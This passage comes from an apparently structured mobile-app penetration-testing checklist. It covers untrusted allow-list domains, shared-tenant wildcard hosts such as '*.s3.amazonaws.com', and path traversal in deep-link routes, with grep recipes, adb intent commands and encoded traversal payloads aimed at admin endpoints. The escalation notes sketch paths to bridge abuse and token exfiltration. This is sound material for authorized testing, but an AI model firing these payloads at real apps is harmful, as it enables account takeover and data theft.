      print(f'{h:50} {flag} {exp}')
  PY
  ```
  Cross-check CNAMEs and every host named in `assetlinks.json` too (D09-020).
- **Proof:** A host in the app's trusted list whose apex is registrable (registrar shows available) or whose
  DNS dangles, plus the code line that trusts it. **Do not register someone else's expired domain** — the
  availability record plus the trust line is the finding; propose the registration as remediation.
- **Escalation:** Oversecured's chain in full: allow-list check passes *legitimately* → app loads your URL →
  app sends its authorisation headers → you hold a valid token. → D13, and → D14 because the app will talk to
  you in whatever transport the entry specifies.
- **Ruled out when:** Every harvested host resolves to client infrastructure with a current registration.
  Attach the counted host list — and count it, because a silent empty `hosts.txt` means your grep paths were
  wrong, not that the app has no allow-list.

### D09-057 · Shared-tenant wildcard hosts in the allow-list

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when a bridge or session follows the load |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | the corpus's Source_To_Sink case (Feb 2026), verbatim: "anyone can create an S3 bucket and host content on `*.s3.amazonaws.com`. This wildcard trust effectively allows attacker-controlled content" — the chain reached `window.nativeBridge.uploadFile()` |

- **Test:** Validation that accepts `*.s3.amazonaws.com`, `*.blob.core.windows.net`, `*.herokuapp.com`,
  `*.github.io`, `*.firebaseapp.com`, `*.web.app`, `*.cloudfront.net`, `*.netlify.app`, `*.pages.dev`, or any
  other shared-tenant wildcard is not validation. Anyone can obtain a hostname inside those zones in minutes.
- **How:**
  ```bash
  grep -rnE 'endsWith\("\.|contains\("|startsWith\("https://' out/sources/ \
    | grep -iE 's3|amazonaws|blob\.core|herokuapp|github\.io|firebaseapp|web\.app|cloudfront|netlify|pages\.dev|azurewebsites|appspot'
  # also mine any hardcoded allow-list array
  grep -rn -A20 'TRUSTED_DOMAINS\|ALLOWED_HOSTS\|WHITELIST\|allowedHosts' out/sources/ | head -40
  adb shell am start -a android.intent.action.VIEW \
    -d "targetapp://open?url=https://your-bucket.s3.amazonaws.com/x.html" com.target.app
  ```
- **Proof:** Your own tenant-hosted page loading inside the app's WebView — confirmed by the in-app
  User-Agent hitting your access log, not by a screenshot — and, if a bridge is attached, a bridge method
  invoked from that page returning data.
- **Escalation:** → D10 bridge abuse → cookie/token exfiltration → D13. Recommend per-object allow-listing or
  a dedicated first-party host as the fix.
- **Ruled out when:** Every allow-list entry is a fully-qualified first-party host with no wildcard, or the
  wildcard covers a zone where the client controls subdomain issuance (their own DNS). Paste the list.

### D09-058 · Router traversal inside the route or path segment

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_access_control.idor.*` when it lands on another user's object |
| **Attacker** | AM-02 |
| **Applies to** | all apps that put a parameter **inside** the URL path (`https://api.target.example/v1/users/{username}`) |
| **Maps to** | HackTricks deep-link guidance ("Parameters in path … you may be able to cause an Open Redirect …, account takeover …, and any other vuln"); MASTG-TEST-0394's `myapp://open?path=../../data/sensitive.txt` archetype |

- **Test:** When the router builds an API path or an internal route by string-concatenating a URI segment, a
  traversal in that segment pushes the request off the intended endpoint. This is distinct from the filesystem
  traversal in D09-064 — here the target is the API path or the route table.
- **How:**
  ```bash
  grep -rn 'getPathSegments()\|getLastPathSegment()' out/sources/ -A10 | grep -nE '\+ *"|format\(|append\(|url\(|baseUrl|Retrofit|@Path'
  # Retrofit's @Path is encoded by default; @Path(encoded = true) is the smell
  grep -rn '@Path(' out/sources/ | grep -i 'encoded *= *true'
  ```
  ```bash
  adb shell am start -a android.intent.action.VIEW -d "targetapp://app/users?username=..%2F..%2Fadmin%2Fusers" com.target.app
  adb shell am start -a android.intent.action.VIEW -d "targetapp://app/users/..%2f..%2fadmin" com.target.app
  adb shell am start -a android.intent.action.VIEW -d "targetapp://open/....//....//admin" com.target.app
  adb shell am start -a android.intent.action.VIEW -d "targetapp://open/%252e%252e%252fadmin" com.target.app
  ```
- **Proof:** The proxy showing the app issuing a request to a **different endpoint** than the deep link
  nominally targets, with the response body. Not the screen — the request.
- **Escalation:** Feed the reachable endpoints into D15 (the same IDOR/BOLA usually exists directly at the
  API, and that is the higher-severity report); an escaped path used as a hostname is an open redirect.
- **Ruled out when:** Path segments are URL-encoded on the way into the request (Retrofit `@Path` without
  `encoded = true`, or an explicit `Uri.encode`), and the router maps the segment through a fixed lookup table
  rather than concatenating it. Quote the code.
